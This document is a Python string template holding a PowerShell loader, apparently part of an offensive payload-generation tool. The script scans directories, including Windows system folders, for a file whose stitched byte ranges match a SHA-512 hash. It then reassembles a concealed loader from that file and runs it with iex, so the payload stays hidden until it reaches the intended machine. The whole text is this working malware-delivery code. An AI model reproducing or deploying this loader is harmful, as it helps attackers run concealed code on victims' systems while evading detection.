buildcode="""
function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    $end = $payload.Length - $minus_bytes -1
    $compHash = $sha512.ComputeHash($payload)
    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($payload, $some_file){{
    
    $read_file = [System.IO.File]::ReadAllBytes($some_file)
    $lookup_table = [System.Convert]::FromBase64String("{3}")
    $tLoc = 0
    $tsize = 0
    $itr = 0
    $decrypted_loader = @()
    write-host "[*] Code Execution"
    write-host "[**] Code Execution Table Lookup Size:",  $lookup_table.Length
    while($itr -lt $lookup_table.Length){{
        if ($itr % 1000 -eq 0 ){{
            write-host "[**] Processing : ", $itr
        }}
        $rLoc =  ([Byte[]] $lookup_table[$itr..($itr+2)]) + [Byte[]] 0x00
        $rSz =   ([Byte[]] $lookup_table[($itr+3)]) + [Byte[]] 0x00
        $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
        $tsize = [bitconverter]::ToUInt16($rSz, 0)
        $decrypted_loader += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
        $tLoc = 0
        $tsize = 0
        $itr+= 4
    }}

    $decrypted_loader = [System.Text.Encoding]::ASCII.GetString($decrypted_loader).Trim([char]0)
    iex $decrypted_loader

}}

function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternumhash, $minus_bytes, $scan_dir){{
    
    Write-Host "[*] File: " , $some_file

    try {{
        $read_file = [System.IO.File]::ReadAllBytes($some_file)
        $tLoc = 0
        $tsize = 0
        $tmpstitchCheck = @()
        $itr = 0

        while($itr -lt $small_table.Length){{
            if ($itr % 1000 -eq 0 ){{
                    write-host "[**] Processing : ", $itr
                }}
                
            $tmp1 = $itr+2
            $tmp2 = $itr+3
            $rLoc =  ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
            $rSz =   ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
            $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
            $tsize = [bitconverter]::ToUInt16($rSz, 0)
            $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
            $tLoc = 0
            $tsize = 0
            $itr+= 4
        }}
        $stitchCheck = $tmpstitchCheck
        Write-Host "[**] Length of the Rebuilt Data: ", $stitchCheck.Length
        #$keyvalue = $read_file[$location..($location + $key_len - 1)]
        #$sha512 = new-Object System.Security.Cryptography.SHA512Managed
        
    }} Catch {{
        return 0
    }}
    
    #no minus bytes for the small check
    $result = Get-CheckHash $stitchCheck $iternumhash 0

   ##################################################################
   ## TODO: Recursive Function
   ##################################################################

    if ($result -eq 1){{
        Write-Host "[**] Short Hashes Match!"
        Write-Host "[*] Starting Full Hash Match Verification"
            
        # open file
        Write-Host "[**] File: ", $some_file
        try {{
            $read_file = [System.IO.File]::ReadAllBytes($some_file)
            $tLoc = 0
            $tsize = 0
            $tmpstitchCheck = @()
            $itr = 0

            while($itr -lt $full_table.Length){{
                if ($itr % 1000 -eq 0 ){{
                    write-host "[**] Processing : ", $itr
                }}
                $tmp1 = $itr+2
                $tmp2 = $itr+3
                $rLoc =  ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
                $rSz =   ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
                $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
                $tsize = [bitconverter]::ToUInt16($rSz, 0)
                $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
                $tLoc = 0
                $tsize = 0
                $itr+= 4
        }}
        $stitchCheck = $tmpstitchCheck
        Write-Host "[**] Length of the Rebuilt Data: ", $stitchCheck.Length
        
    }} Catch {{
        return 0
    }}
    
    #minus bytes required for the full check
    $result = Get-CheckHash $stitchCheck $payload_hash $minus_bytes
        
       if ($result -eq 1){{
        Write-Host "[*] Final Hashes Match"
        Get-CodeExecution $stitchCheck $some_file
        return 1

        }}
    }}   
}}

function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir){{
    $dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    $sys_paths = @( "c:\", "c:\windows", "c:\windows\system32")
    
    if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
        $dir_parsing += get-childitem "\Windows\sysnative" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    }} 

    foreach ($some_file in $dir_parsing){{
        if ((Get-Item $some_file) -isnot [System.IO.DirectoryInfo] ){{
            if ( (Get-R-Done $some_file $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir) -eq 1) {{
                break
            }}
        }}
    }}
}}


	$lookup_table = [System.Convert]::FromBase64String("{0}")
	$payload_hash = "{1}"
	$iternumhash = "{2}"
    $minus_bytes = {4}
	$scan_dir = "{5}"

    $size_init_table = [bitconverter]::ToUInt32($lookup_table[0..3], 0)
    $size_full_table = $lookup_table.Length

    Write-Host "[*] Small (10%) Table Size: " , $size_init_table
    Write-Host "[*] Full Table Size: " , $size_full_table

    $small_table = $lookup_table[4..(($size_init_table*4)+3)]
    $full_table = $lookup_table[4..($size_full_table-1)]
 
    if ($scan_dir.Contains("%")){{
        $scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
    }}

    Get-Walk-OS $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir 
"""